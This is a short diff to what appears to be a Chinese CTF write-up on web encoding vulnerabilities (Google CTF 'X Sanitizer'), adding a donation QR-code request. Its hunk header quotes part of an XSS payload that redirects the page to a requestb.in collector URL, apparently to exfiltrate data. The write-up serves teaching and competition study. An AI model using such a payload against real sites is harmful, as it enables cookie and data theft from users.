@@ -415,6 +415,10 @@ gen_payload('=1; location.href="https://requestb.in/1447b711?inspect?" + escape(
 
 Web应用中的编码历来都是问题的多发地，无论是曾经IE中的`utf-7`编码问题，MySQL宽字节注入以及利用编码绕过WAF等等。可以说，只要涉及到数据的传递和流动，就必然涉及到编码转换，而只要有编码不统一的地方，就有可能存在漏洞，这一点，无论对攻击者或防御者都需要注意。
 
+如果你觉得本文对你有帮助，欢迎打赏我一杯咖啡钱，支持我写出更多好文章~
+
+![](/assets/images/qrcode.png)
+
 ## 0x07 参考资料
 
 - https://l4w.io/2017/06/google-ctf-the-x-sanitizer-%E2%80%92-writeup/
